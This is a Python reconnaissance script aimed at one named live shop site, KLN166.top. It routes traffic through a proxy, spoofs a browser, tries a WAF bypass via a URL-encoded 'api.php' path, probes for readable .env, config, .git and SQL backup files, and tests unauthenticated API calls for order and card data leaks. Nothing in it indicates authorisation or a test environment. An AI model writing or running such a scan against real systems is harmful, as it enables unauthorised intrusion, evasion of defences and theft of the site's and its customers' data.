#!/usr/bin/env python3
"""KLN166.top quick recon scanner"""
import json
import os
import re
import subprocess
import sys
from datetime import datetime
from pathlib import Path

BASE = "https://KLN166.top/shop/"
ROOT = "https://KLN166.top/"
OUT = Path("/workspace/results/kln166.top/recon_20260718")
OUT.mkdir(parents=True, exist_ok=True)
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
JAR = str(OUT / ".cookies")
PROXY = os.environ.get("PROXY_URL", "")
FINDINGS = []


def load_proxy():
    p = Path("/data/config/proxy.env")
    if p.exists():
        for line in p.read_text().splitlines():
            if line.startswith("PROXY_URL="):
                return line.split("=", 1)[1].strip().strip('"')
    return PROXY


PX = load_proxy()


def curl(url, post=None, hdrs=None):
    cmd = ["curl", "-sk", "--max-time", "12", "-b", JAR, "-c", JAR, "-A", UA,
           "-H", f"Referer: {BASE}", "-w", "\n__C__%{http_code}"]
    if PX:
        cmd = ["curl", "-x", PX, "-sk", "--max-time", "12", "-b", JAR, "-c", JAR, "-A", UA,
               "-H", f"Referer: {BASE}", "-w", "\n__C__%{http_code}"]
    if hdrs:
        for k, v in hdrs.items():
            cmd += ["-H", f"{k}: {v}"]
    if post:
        cmd += ["-X", "POST", "-d", post, "-H", "Content-Type: application/x-www-form-urlencoded"]
    cmd.append(url)
    try:
        raw = subprocess.run(cmd, capture_output=True, text=True, timeout=15).stdout or ""
        m = re.search(r"__C__(\d+)$", raw)
        code = int(m.group(1)) if m else 0
        body = raw[:m.start()] if m else raw
        return code, body
    except Exception as e:
        return 0, str(e)


def add(sev, title, ev=""):
    FINDINGS.append({"severity": sev, "title": title, "evidence": ev[:400]})
    print(f"[{sev}] {title} | {ev[:120]}")


def main():
    print(f"scan {BASE} proxy={PX.split('@')[-1] if PX else 'none'}")
    code, home = curl(BASE)
    (OUT / "home.html").write_text(home[:200000], encoding="utf-8", errors="ignore")
    print(f"home http={code} size={len(home)}")
    csrf_m = re.search(r'csrf_token\s*=\s*"([^"]+)"', home)
    csrf = csrf_m.group(1) if csrf_m else ""
    title_m = re.search(r"<title>([^<]+)", home)
    print(f"title={title_m.group(1) if title_m else '?'} csrf={bool(csrf)}")

    # framework hints
    for hint in ("独角", "彩虹", "发卡", "faka", "dujiaoke", "Geetest", "csrf_token"):
        if hint in home:
            add("信息", f"页面含 {hint}")

    # key endpoints
    tests = [
        ("api_waf", f"{BASE}api.php/?act=search&id=1"),
        ("api_bypass", f"{BASE}%61pi.php/?act=search&id=1"),
        ("api_bypass2", f"{BASE}%61pi.php/?act=search&id=1&key=test"),
        ("getcount", f"{BASE}ajax.php?act=getcount"),
        ("getclass", f"{BASE}ajax.php?act=getclass"),
        ("gettoolnew", f"{BASE}ajax.php?act=gettoolnew"),
        ("captcha", f"{BASE}ajax.php?act=captcha"),
        ("epay", f"{BASE}other/epay_notify.php"),
        ("cron", f"{BASE}cron.php"),
        ("user", f"{BASE}user/"),
        ("sup", f"{BASE}sup/"),
    ]
    for name, url in tests:
        c, b = curl(url, hdrs={"X-Requested-With": "XMLHttpRequest"})
        add("中" if b and len(b) > 5 else "低", f"{name} HTTP{c}", b[:200])
        if name == "api_bypass" and "请提供" in b:
            add("高", "api.php WAF绕过存在，需API Key", b[:200])
        if name == "getcount" and '"code":0' in b:
            add("高", "getcount 业务数据泄露", b[:300])
        if name == "api_waf" and not b.strip():
            add("中", "api.php 正常路径被WAF丢弃")

    # ajax acts quick
    interesting = []
    for act in ["getcount", "getclass", "gettool", "gettoolnew", "order", "query", "pay", "captcha", "siteinfo"]:
        c, b = curl(f"{BASE}ajax.php?act={act}", hdrs={"X-Requested-With": "XMLHttpRequest"})
        if c == 200 and b.strip() and "No Act" not in b:
            interesting.append({"act": act, "body": b[:200]})
    (OUT / "ajax.json").write_text(json.dumps(interesting, ensure_ascii=False, indent=2))

    # sensitive files
    for p in [".env", "config.php", ".git/HEAD", "backup.sql", "install/install.lock"]:
        c, b = curl(BASE + p)
        if c == 200 and len(b) > 20 and "403" not in b[:100]:
            add("高", f"可读 {p}", b[:200])

    # IDOR test api with empty key
    for url in [
        f"{BASE}%61pi.php/?act=search&id=1",
        f"{BASE}%61pi.php/?act=search&id=1&key=",
        f"{BASE}%61pi.php/?act=orders",
        f"{BASE}%61pi.php/?act=siteinfo",
    ]:
        c, b = curl(url)
        if '"code":0' in b or "kminfo" in b:
            add("严重", f"未授权API {url}", b[:300])

    (OUT / "findings.json").write_text(json.dumps(FINDINGS, ensure_ascii=False, indent=2))
    print(f"done findings={len(FINDINGS)} -> {OUT}")


if __name__ == "__main__":
    main()
